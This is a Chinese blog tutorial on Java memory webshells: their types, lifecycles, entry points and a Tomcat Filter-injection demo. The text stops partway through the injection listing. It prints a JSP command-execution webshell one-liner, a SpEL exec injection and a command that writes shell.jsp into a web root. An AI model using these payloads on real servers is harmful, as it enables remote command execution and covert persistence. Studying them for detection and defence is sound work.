

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
  <link rel="icon" href="/img/url.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="J_0k3r">
  <meta name="keywords" content="">
  
    <meta name="description" content="这种天国高攀不到 没什么可以投诉 -《天公地道》">
<meta property="og:type" content="article">
<meta property="og:title" content="Java内存马原理及利用">
<meta property="og:url" content="http://example.com/2025/10/02/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="J_0k3r">
<meta property="og:description" content="这种天国高攀不到 没什么可以投诉 -《天公地道》">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/wbt.jpg">
<meta property="article:published_time" content="2025-10-02T05:14:52.000Z">
<meta property="article:modified_time" content="2025-10-02T16:30:31.012Z">
<meta property="article:author" content="J_0k3r">
<meta property="article:tag" content="笔记">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/wbt.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Java内存马原理及利用 - J_0k3r</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 100vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>J_0k3r的无人之境</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/playlist/" target="_self">
                <i class="iconfont icon-music"></i>
                <span>音乐</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/tgdd.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Java内存马原理及利用"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        J_0k3r
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-02 13:14" pubdate>
          2025年10月2日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          114 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Java内存马原理及利用</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年10月3日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h2 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h2><h3 id="内存马简介"><a href="#内存马简介" class="headerlink" title="内存马简介"></a>内存马简介</h3><p>内存马是webshell的一种，不同于文件马，内存马无文件落地。顾名思义，内存马将恶意逻辑直接注入到目标 Java Web 应用程序的运行时内存中。内存马可以绕过文件监测系统，不易被定位和监控。在绕过安全设备和实现持久化控制上优于传统文件马。</p>
<h3 id="java内存马分类"><a href="#java内存马分类" class="headerlink" title="java内存马分类"></a>java内存马分类</h3><p>按挂载点不同分为以下：</p>
<ol>
<li>Servlet-api类</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Filter内存马<br>Servlet内存马<br>Listener内存马<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>Spring类</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Spring Controller 内存马<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>Tomcat Valve 内存马</li>
<li>MBean 内存马</li>
<li> Agent 内存马</li>
</ol>
<p><img src="/mdimg/javamemshell1/1757864224727-a7f4ab95-19cf-4ef8-8678-2e3d47952c18.jpeg" srcset="/img/loading.gif" lazyload></p>
<h3 id="内存马的生命周期"><a href="#内存马的生命周期" class="headerlink" title="内存马的生命周期"></a>内存马的生命周期</h3><p>内存马的生命周期与 Web 容器、应用部署、JVM 运行状态紧密相关。</p>
<p>内存马自注入到运行中的web容器开始，随容器运行，一般在web容器、web服务停止/重启时死亡。</p>
<p>不同类型的内存马的生命周期有区别，与其挂载点有关。总结就是：</p>
<blockquote>
<p><strong>内存马的生命周期 = 它所寄生组件的生命周期。清除内存马的本质，是摧毁其寄生环境 —— 重部署、重启、或 JVM 终结</strong></p>
</blockquote>
<p>web应用重启指重启对应的web应用（tomcat可能同时运行不同web应用），影响较小。JVM重启指重启tomcat服务<code>sudo systemctl restart tomcatv</code>，影响所有web应用。</p>
<p>各类型内存马生命周期具体如下</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>生命周期起点</strong></th>
<th><strong>生命周期持续阶段</strong></th>
<th><strong>生命周期终点</strong></th>
<th><strong>是否可热清除（不重启JVM）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Filter</strong></td>
<td><code>addFilter()</code> 成功执行或反射注入完成</td>
<td>持续拦截请求，除非被移除或上下文销毁</td>
<td>Web 应用 reload / undeploy / 重启</td>
<td>✅ 是（重部署即可）</td>
</tr>
<tr>
<td><strong>Servlet</strong></td>
<td><code>addServlet()</code> 成功执行或反射注入完成</td>
<td>响应特定路径，除非被移除</td>
<td>Web 应用 reload / undeploy / 重启</td>
<td>✅ 是</td>
</tr>
<tr>
<td><strong>Listener</strong></td>
<td><code>addListener()</code> 或应用启动时初始化</td>
<td>随 Context/Session 生命周期持续运行</td>
<td>Web 应用 stop / 重启</td>
<td>部分（如HttpSession相关）</td>
</tr>
<tr>
<td><strong>Spring Controller</strong></td>
<td>注入到 HandlerMapping 成功</td>
<td>随 Spring MVC 分发器持续生效</td>
<td><code>/refresh</code> / Context 重启 / 应用重启</td>
<td>✅ 是（/refresh 即可）</td>
</tr>
<tr>
<td><strong>Java Agent</strong></td>
<td>JVM 启动时加载 或 attach 注入成功</td>
<td>持续 Hook 字节码，独立于 Web 层</td>
<td>JVM 进程终止</td>
<td>❌ 否</td>
</tr>
<tr>
<td><strong>Tomcat Valve</strong></td>
<td>注入到 Container Pipeline 成功</td>
<td>在 Connector 层持续生效，早于 Filter</td>
<td>Tomcat Server 重启</td>
<td>❌ 否（需重启 Server）</td>
</tr>
<tr>
<td><strong>MBean</strong></td>
<td><code>registerMBean()</code> 成功</td>
<td>持续驻留 MBeanServer，可被远程调用</td>
<td>手动 unregister / JVM 重启</td>
<td>✅ 是（可手动注销）</td>
</tr>
</tbody></table>
<p>内存马生命周期流程图</p>
<p><img src="/mdimg/javamemshell1/1757851548900-cb6c80ab-8ab9-4d4e-967e-9e61d6fc8db8.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>内存马的注入实际上就是执行Java代码。所以内存马利用的必要前提条件就是能够在web应用的上下文执行Java代码。</p>
<p>通常通过以下方式：</p>
<table>
<thead>
<tr>
<th><strong>入口类型</strong></th>
<th><strong>说明</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1. JSP Webshell</strong></td>
<td>上传或写入一个 JSP 文件，内含 Java 代码</td>
<td><code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;</code></td>
</tr>
<tr>
<td><strong>2. 反序列化漏洞</strong></td>
<td>利用 Java 反序列化漏洞（如 Commons-Collections、Fastjson、Jackson）执行代码</td>
<td>Fastjson <code>@type</code> 指定恶意类，触发构造器或 getter</td>
</tr>
<tr>
<td><strong>3. 表达式注入</strong></td>
<td>利用 EL 表达式、SpEL、OGNL、MVEL 等执行动态代码</td>
<td>Spring SpEL：<code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code></td>
</tr>
<tr>
<td><strong>4. 文件上传 + 目录穿越/解析漏洞</strong></td>
<td>上传 JSP 文件到可执行目录</td>
<td>上传 <code>shell.jsp</code> 到 <code>/webapps/ROOT/</code></td>
</tr>
<tr>
<td><strong>5. 框架 RCE 漏洞</strong></td>
<td>如 Struts2、Spring Cloud、Shiro、Log4j2 等框架漏洞</td>
<td>Log4j2 JNDI 注入 → 加载远程恶意类</td>
</tr>
<tr>
<td><strong>6. 管理后台 / 调试接口</strong></td>
<td>如 Spring Boot Actuator、Druid 监控、Swagger 未授权</td>
<td><code>/actuator/</code> + <code>env</code> + <code>restart</code> + 自定义注入</td>
</tr>
<tr>
<td><strong>7. 服务器命令执行 → 写入 JSP</strong></td>
<td>通过其他漏洞（如 PHP、Python RCE）写入 JSP 文件</td>
<td>服务器存在 Python RCE → <code>echo &#39;&lt;%...%&gt;&#39; &gt; /tomcat/webapps/ROOT/shell.jsp</code></td>
</tr>
<tr>
<td><strong>8. Java Agent 附加（高阶）</strong></td>
<td>通过 <code>VirtualMachine.attach(pid)</code> 注入 Agent（需本地权限）</td>
<td>利用本地漏洞或运维权限 attach 到 Tomcat 进程</td>
</tr>
</tbody></table>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>tomcat 9.0.104 + jdk1.8.0_101</p>
<p>Springboot 3.5.6 + Java17</p>
<h2 id="servlet-api类"><a href="#servlet-api类" class="headerlink" title="servlet-api类"></a>servlet-api类</h2><blockquote>
<p>在 Java Web 开发中，<strong>Servlet</strong>、<strong>Filter</strong> 和 <strong>Controller</strong> 是三个核心组件</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">客户端请求<br>    ↓<br>Filter（如 CharacterEncodingFilter、CorsFilter 等）<br>    ↓<br>DispatcherServlet（继承自 HttpServlet，是前端控制器）<br>    ↓<br>HandlerMapping → 找到对应的 <span class="hljs-meta">@Controller</span><br>    ↓<br>Controller 方法执行（调用 Service、返回 ModelAndView 或 JSON）<br>    ↓<br>返回响应（经过 Filter 的 response 后处理）<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>Filter</strong> 像是“安检门”：检查每个人（请求）是否携带违禁品（非法参数、未登录等），决定是否放行。</li>
<li><strong>DispatcherServlet</strong> 像是“前台接待”：接收所有来访者，根据需求（URL）分配到对应部门（Controller）。</li>
<li><strong>Controller</strong> 像是“业务专员”：具体处理客户的需求（业务逻辑）。</li>
</ul>
<h3 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h3><ul>
<li><strong>挂载点：</strong>Servlet<code>Filter</code>链（例如：Tomcat 的<code>ApplicationFilterChain</code>）。</li>
<li><strong>原理：</strong>攻击者通过反射在运行时向<code>FilterChain</code>动态注册一个恶意的<code>javax.servlet.Filter</code>实例。由于 Filter 位于请求处理的最前端，它能<strong>在请求到达目标 Servlet/Controller 之前</strong>拦截所有或特定 URL 的请求。</li>
<li><strong>企业级危害：极具威胁。</strong>Filter 内存马可以实现前置身份验证绕过、会话劫持、敏感数据过滤（例如，拦截信用卡号或密码）、WebShell 命令执行。它位于请求处理的最上层，几乎可以影响所有传入流量。</li>
</ul>
<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>idea + maven +tomcat9</p>
<p>pom.xml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0</span><br><span class="hljs-string">         http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>  &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>  &lt;groupId&gt;com.example&lt;/groupId&gt;<br>  &lt;artifactId&gt;memory-shell-demo&lt;/artifactId&gt;<br>  &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br>  &lt;packaging&gt;war&lt;/packaging&gt;<br><br>  &lt;properties&gt;<br>    &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>    &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>    &lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>  &lt;/properties&gt;<br><br>  &lt;dependencies&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;<br>      &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;<br>      &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>      &lt;scope&gt;provided&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>  &lt;/dependencies&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure>

<p>Myservlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@WebServlet(&quot;/time&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> sdf.format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br><br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        resp.getWriter().println(<span class="hljs-string">&quot;&lt;h2&gt; 当前时间：&quot;</span> + now + <span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>);<br>        resp.getWriter().println(<span class="hljs-string">&quot;&lt;a href=&#x27;/&#x27;&gt;返回首页&lt;/a&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Myfilter.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebFilter(&quot;/filter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        servletResponse.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>        out.println(<span class="hljs-string">&quot;Myfilter被执行了 cmd = &quot;</span>+cmd);<br>        System.out.println(<span class="hljs-string">&quot;Myfilter被执行了 cmd = &quot;</span>+cmd);<br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>index.jsp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;内存马演示 Demo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;ul&gt;<br>    &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;time&quot;</span>&gt;查看当前时间（正常 Servlet）&lt;/a&gt;&lt;/li&gt;<br>    &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;shell.jsp&quot;</span>&gt; 注入 Filter 内存马&lt;/a&gt;&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<h4 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h4><h5 id="Filter-链是如何构建的"><a href="#Filter-链是如何构建的" class="headerlink" title="Filter 链是如何构建的"></a>Filter 链是如何构建的</h5><p>当请求到达时，Tomcat 会：</p>
<ol>
<li>根据请求路径（如 <code>/filter</code>），遍历 <code>StandardContext.filterMaps</code> 数组</li>
<li>对每个 <code>FilterMap</code>：<ul>
<li>检查 <code>URL Pattern</code> 是否匹配（精确匹配 &gt; 通配符匹配）</li>
<li>检查 <code>Dispatcher</code> 是否匹配（默认是 <code>REQUEST</code>）</li>
</ul>
</li>
<li>根据匹配的<code>FilterMap</code>寻找对应的<code>FilterName</code>然后根据<code>filterConfigs.get(filterName)</code>得到<code>filterConfig</code> 。<code>filterConfigs</code>在web应用启动时就已经加载了所有的<code>filterConfig</code> 。</li>
<li> 把 <code>filterConfig.getFilter()</code> 得到实例加入 <strong>Filter 链（ApplicationFilterChain）</strong></li>
<li>最终按 <strong>顺序</strong> 依次执行Filter链的<code>doFilter</code>方法</li>
</ol>
<p>也就是说，<code>FilterMap</code>、<code>FilterMaps</code> 、<code>filterConfigs</code>、<code>filterConfig</code> 都是在web应用启动时就已经构建好固定的 ，唯一随着请求不同的路由变化的是<strong>Filter 链，也就是在前面这些固定的中按需取用匹配路由的filter调用其adofilter方法。</strong></p>
<p>所以要实现内存马的注入就需要在每一个固定的数据（<code>FilterDef</code>、<code>FilterMap</code>、<code>FilterMaps</code> 、<code>filterConfigs</code>、<code>filterConfig</code>）中进行修改加入对应的filter配置。</p>
<h5 id="shell-jsp-1"><a href="#shell-jsp-1" class="headerlink" title="shell.jsp 1"></a>shell.jsp 1</h5><blockquote>
<p><strong>没有修改 Filter 链顺序，但“骗过了”Filter 链的组装机制 → Filter 会执行，但顺序不可控（通常在最后）</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 